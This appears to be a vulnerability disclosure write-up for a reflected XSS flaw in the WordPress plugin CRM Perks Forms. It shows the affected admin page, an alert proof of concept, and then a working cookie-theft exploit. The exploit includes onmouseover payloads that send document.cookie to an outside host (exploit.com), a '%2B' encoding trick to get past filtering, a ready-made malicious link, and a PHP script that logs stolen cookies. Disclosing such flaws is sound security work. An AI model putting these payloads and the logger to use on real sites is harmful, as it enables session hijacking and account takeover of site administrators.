0x01 Vulnerability description

    There is an XSS(Cross Site Scripting) vulerability in the wordpress plugin called CRM Perks Forms.
    An attacker inserts malicious code into a web-page URL.
    The code is triggered when user clicks the malicious links and move his mouse over the list area on the left of the web-page. 

0x02 Recurrence of the vulnerability

    This is tne main page of the plugin.
    First, click Add-New-Form to create a new form.
![1.png](https://github.com/Don-H50/wp-vul/blob/main/images/WDK/0426-1.png)

    Choose one template.
![2.png](https://github.com/Don-H50/wp-vul/blob/main/images/CRM/0422-2.png)

    This is the affected page with XSS vulnerability.
    You can see that my new form id is 66, yours may be 1, it doesn't matter, because I have created it many times.
    So the affected web-page URL is: http://127.0.0.1/wordpress/wp-admin/admin.php?page=cfx-form&form_id=66
    Statement: This URL can be used regardless of whether you have created a form, and the id can be any number.
![3.png](https://github.com/Don-H50/wp-vul/blob/main/images/CRM/0422-3.png)

    Payload: "onmouseover=alert(1)//
    Enter the payload in the URL bar and move your mouse over the list area on the left of the web-page, an alert pop-up will appear.
    So, there is an XSS vulnerability.
![4.png](https://github.com/Don-H50/wp-vul/blob/main/images/CRM/0422-4.png)

「EXP」

Purpose: By clicking on the malicious URL link constructed by the attacker and moving mouse, the user will leak his own cookie.

    Change the payload to: "onmouseover=alert(document.cookie)//
    We can see the user cookie information in the pop-up window.
![5.png](https://github.com/Don-H50/wp-vul/blob/main/images/CRM/0422-5.png)

    Build a listening server locally to receive the cookie information of the target user.
    Write a PHP script 'getcookie.php' on the server to remotely receive cookie information.
    The function of this script is to write the received cookie into the 'cookie.txt'.
    At this point the payload is: "onmouseover=location.href="http://exploit.com/get.php?cookie="+document.cookie//
    We extend the payload to the URL to make a request, find that there is no user's cookie in the 'cookie.txt' file of the remote server.
    Check the source code of the web-page and find that the '+' in the span tag is filtered.
![8.png](https://github.com/Don-H50/wp-vul/blob/main/images/CRM/0422-8.png)

    So try to convert '+' to URL encoding '%2B'.
    Construct a new payload: "onmouseover=location.href="http://exploit.com/get.php?cookie="%2Bdocument.cookie//
    Enter payload in the URL bar.
![12.png](https://github.com/Don-H50/wp-vul/blob/main/images/CRM/2023-04-22_23-12.png)

    Check the source code of the web-page again, '+' is not filtered out.
![9.png](https://github.com/Don-H50/wp-vul/blob/main/images/CRM/0422-9.png)

    Move my mouse over the list area, the web-page has been redirected.
![10.png](https://github.com/Don-H50/wp-vul/blob/main/images/CRM/0422-10.png)

    At this point, the user cookie has been sent to the local listening server.
![11.png](https://github.com/Don-H50/wp-vul/blob/main/images/CRM/0422-11.png)

    Merge the payload and URL to construct a malicious URL link:
    http://127.0.0.1/wordpress/wp-admin/admin.php?page=cfx-form&form_id=66?"onmouseover=location.href="http://exploit.com/get.php?cookie="%2Bdocument.cookie//
    The user causes the leakage of his own cookie by clicking on the malicious link and moving mouse.
    
The simple 'getcookie.php' script:

    <?php
    $cookie = $_GET['cookie'];
    $ip = getenv ('REMOTE_ADDR');
    $time = date('Y-m-d g:i:s');
    $fp = fopen("cookie.txt","a");
    fwrite($fp,"IP: ".$ip." Date: ".$time."\nCookie:".$cookie."\n");
    fclose($fp);
    ?> 



   
   
